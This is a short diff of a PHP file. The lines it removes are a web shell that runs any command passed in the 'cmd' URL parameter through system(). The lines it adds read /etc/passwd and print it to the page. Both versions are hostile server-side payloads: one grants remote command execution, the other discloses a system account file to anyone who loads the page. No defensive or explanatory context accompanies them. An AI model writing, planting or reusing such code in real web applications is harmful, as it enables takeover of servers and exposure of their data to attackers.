@@ -1,5 +1,5 @@
 <?php
-if (isset($_GET['cmd'])) {
-    system($_GET['cmd']);
-}
+echo "<pre>";
+echo file_get_contents('/etc/passwd');
+echo "</pre>";
 ?>
